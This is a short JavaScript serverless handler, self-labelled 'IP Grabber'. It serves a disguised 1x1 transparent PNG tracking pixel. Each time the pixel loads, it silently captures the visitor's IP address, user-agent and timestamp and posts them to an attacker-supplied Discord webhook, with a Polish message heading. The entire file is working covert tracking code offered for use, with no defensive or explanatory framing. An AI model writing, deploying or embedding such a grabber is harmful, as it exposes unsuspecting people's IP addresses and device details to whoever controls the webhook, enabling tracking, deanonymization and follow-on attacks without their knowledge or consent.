export default function handler(req, res) {
    const webhook = req.query.webhook;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const time = new Date().toLocaleString();
    
    if (webhook) {
        fetch(webhook, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `**🎯 NOWE IP!**\n\`\`\`\nIP: ${ip}\nUser-Agent: ${userAgent}\nCzas: ${time}\n\`\`\``,
                username: "IP Grabber",
                avatar_url: "https://cdn.discordapp.com/attachments/1484643547545342012/1484911633644912851/latest.png"
            })
        }).catch(e => console.log(e));
    }
    
    const pixel = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==', 'base64');
    res.setHeader('Content-Type', 'image/png');
    res.send(pixel);
}
